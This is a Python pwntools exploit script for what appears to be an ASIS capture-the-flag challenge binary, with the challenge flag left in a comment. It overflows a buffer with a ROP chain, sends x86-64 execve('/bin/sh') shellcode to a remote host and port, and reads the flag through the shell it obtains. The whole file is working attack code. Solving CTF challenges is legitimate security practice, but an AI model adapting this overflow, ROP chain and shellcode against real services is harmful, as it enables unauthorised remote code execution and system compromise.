#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# ASIS{W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?}

e = ELF('./elf4')
#l = ELF('')

context.arch = 'amd64'

#y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
#print util.proc.pidof(y)

magic = 0x4


host , port = '146.185.168.172' , 8642
#host , port = '192.168.78.141' , 4000
y = remote( host , port )

bss = 0x601040
pop_rdi = 0x4006f3
ppr = 0x4006f1 # pop rsi ; pop r15 ; ret

p = 'D' * 0x70
p += p64( bss + 0x20 )
p += flat(
    ppr,
    bss + 0x28,
    0x0,
    0x400676,
)

y.sendlineafter('\n' , p)
sleep(1)

sc = 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

p = flat(
    bss + 0x30,
    sc
)
y.sendline( p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()